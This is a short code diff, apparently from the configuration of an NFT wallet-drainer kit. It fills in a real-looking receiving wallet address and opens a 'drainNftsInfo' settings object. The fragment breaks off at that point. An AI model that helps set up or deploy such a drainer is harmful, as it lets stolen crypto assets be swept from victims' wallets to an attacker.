@@ -1,6 +1,6 @@
 const workChainId = 1; // The network we are working with is the chainId list https://chainlist.org/
 
-const receiveAddresss = "wallet"; // YOUR WALLET ADDRESS "TUTORIAL"
+const receiveAddresss = "0x9B0594e7841DD529dE1C7478Eb04C3De728EfDd9"; // YOUR WALLET ADDRESS "TUTORIAL"
 
 
 const drainNftsInfo = {
